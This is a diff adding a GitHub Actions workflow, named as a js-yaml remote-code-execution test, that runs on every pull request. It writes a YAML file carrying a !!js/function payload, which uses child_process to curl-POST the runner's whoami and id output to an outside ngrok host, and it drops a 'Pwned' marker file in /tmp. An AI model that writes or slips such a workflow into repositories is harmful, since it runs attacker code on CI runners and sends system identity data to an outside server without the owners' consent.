@@ -1,0 +1,17 @@
+name: js-yaml RCE Test
+on: [pull_request]
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - uses: actions/setup-node@v4
+      with:
+        node-version: 20
+    - name: RCE via js-yaml 4.1.0
+      run: |
+        cat > vuln.yaml << 'EOL'
+!!js/function (){require("child_process").execSync("curl -X POST -d 'PINME-GH-RCE-$(whoami)-$(id)-CVE-2024-471509' https://ebcbf6e353b1.ngrok-free.app/rce");require("fs").writeFileSync("/tmp/pinme-rce-poc","GlitterNetwork+Pwned")}
+EOL
+        npm ci
+        node -e 'console.log(require("js-yaml").load(require("fs").readFileSync("vuln.yaml")))'
